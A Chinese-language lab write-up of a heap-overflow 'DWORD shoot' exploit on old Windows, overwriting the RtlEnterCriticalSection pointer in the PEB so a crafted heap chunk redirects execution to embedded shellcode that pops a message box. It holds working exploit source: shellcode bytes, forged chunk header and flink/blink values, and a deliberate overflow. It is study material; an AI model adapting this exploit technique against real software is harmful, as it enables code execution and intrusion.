<h1 id="實驗環節-dword-shoot-攻擊">實驗環節 Dword shoot 攻擊</h1>
<p><img src="https://i.imgur.com/2yxVfKY.png" alt="enter image description here"></p>
<p><img src="https://i.imgur.com/58oIJps.png" alt="enter image description here"></p>
<p><img src="https://i.imgur.com/8dh5A4X.png" alt="enter image description here"></p>
<h3 id="查看peb--0x20--中的-rtlentercriticalsection函數指針">查看PEB + 0x20  中的 RtlEnterCriticalSection()函數指針</h3>
<p><img src="https://i.imgur.com/iPcMDAp.png" alt="enter image description here"></p>
<p>1.DWORD SHOOT 的目標是 0x7FFDF020 處的 RtlEnterCriticalSection()函數指針，可以<br>
簡單地將其直接修改為 shellcode 的位置。</p>
<p>2.DWORD SHOOT 完畢後，堆溢出導致異常，最終將調用 ExitProcess()結束進程。</p>
<p>3.ExitProcess()在結束進程時需要調用臨界區函數來同步線程，但卻從 P.E.B 中拿出了指<br>
向 shellcode 的指針，因此 shellcode 被執行。</p>
<h3 id="od-設置-just-in-time--debugger-會自動捕捉--先設下的-int-3，方便調適真實狀態">1.OD 設置 just in time  debugger 會自動捕捉  先設下的 int 3，方便調適真實狀態</h3>
<hr>
<pre><code>

#include &lt;windows.h&gt;


char shellcode[]=
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90";
// 200 bytes






int main()
{
	HLOCAL h1 = 0, h2 = 0;
	HANDLE hp;
	hp = HeapCreate(0,0x1000,0x10000);
	h1 = HeapAlloc(hp,HEAP_ZERO_MEMORY,200);
	__asm int 3 //used to break the process
	memcpy(h1,shellcode,200); //normal cpy, used to watch the heap
	//memcpy(h1,shellcode,0x200); //overflow,0x200=512
	h2 = HeapAlloc(hp,HEAP_ZERO_MEMORY,8);
	return 0;
}


</code></pre>
<hr>
<h3 id="vc-6.0-快速搭建-release">VC++ 6.0 快速搭建 release</h3>
<p>1.先創資料夾<br>
<img src="https://i.imgur.com/DcPRZIs.png" alt="enter image description here"></p>
<p>2.編譯完後</p>
<p><img src="https://i.imgur.com/2D1zUfJ.png" alt="enter image description here"></p>
<p>3.設release版</p>
<p><img src="https://i.imgur.com/2Uslfjm.png" alt="enter image description here"></p>
<h3 id="在od-調適好後，把中斷-int-3-註解掉，並使用-memcpyh1shellcode0x200-造成溢出，才能成功。">在OD 調適好後，把中斷 int 3 註解掉，並使用 memcpy(h1,shellcode,0x200) 造成溢出，才能成功。</h3>
<pre><code>#include &lt;windows.h&gt;


char shellcode[]=

//padding for 200 bytes
"\x90\x90\x90\x90"
"\x90\x90\x90\x90"   // shellcode + 0x04 這個位置會被指針反射掉
"\x90\x90\x90\x90"

//修復 RtlEnterCriticalSection()函數指針
"\xB8\x20\xF0\xFD\x7F" //MOV EAX,7FFDF020 
"\xBB\xE0\x7E\xF8\x77" //MOV EBX,77F87EE0
"\x89\x18"//MOV DWORD PTR DS:[EAX],EBX 

"\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"
"\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"
"\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"
"\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95"
"\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59"
"\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A"
"\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75"
"\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03"
"\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB"
"\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50"
"\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90\x90\x90\x90\x90\x90\x90"

"\x16\x01\x1A\x00\x00\x10\x00\x00"// 設定塊首狀態

"\x88\x06\x42\x00" // flink
"\x20\xf0\xfd\x7f"; // blink






int main()
{
   HLOCAL h1 = 0, h2 = 0;
   HANDLE hp;
   hp = HeapCreate(0,0x1000,0x10000);
   h1 = HeapAlloc(hp,HEAP_ZERO_MEMORY,200);
   //__asm int 3 //used to break the process
   //memcpy(h1,shellcode,200); //normal cpy, used to watch the heap
   memcpy(h1,shellcode,0x200); //overflow,0x200=512
   h2 = HeapAlloc(hp,HEAP_ZERO_MEMORY,8);
   return 0;
}


</code></pre>
<h3 id="猜應該是堆被破壞掉所以堆管理器發生錯誤">猜應該是堆被破壞掉所以堆管理器發生錯誤</h3>
<p><img src="https://i.imgur.com/xNgt5BW.png" alt="enter image description here"></p>
<h3 id="按下ok">按下OK</h3>
<p><img src="https://i.imgur.com/08Peyay.png" alt="enter image description here"></p>

